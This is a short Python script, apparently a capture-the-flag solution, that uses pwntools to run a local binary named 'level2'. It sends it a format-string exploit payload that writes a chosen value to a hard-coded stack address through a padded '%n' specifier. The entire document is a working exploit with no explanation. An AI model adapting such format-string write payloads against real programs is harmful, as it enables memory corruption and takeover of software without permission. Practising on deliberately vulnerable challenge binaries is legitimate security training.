
from pwn import *

p=process("./level2")
payload="\x28\xd5\xff\xff%01996d%5$n"
print(payload)
p.sendline(payload)
print(p.recvall())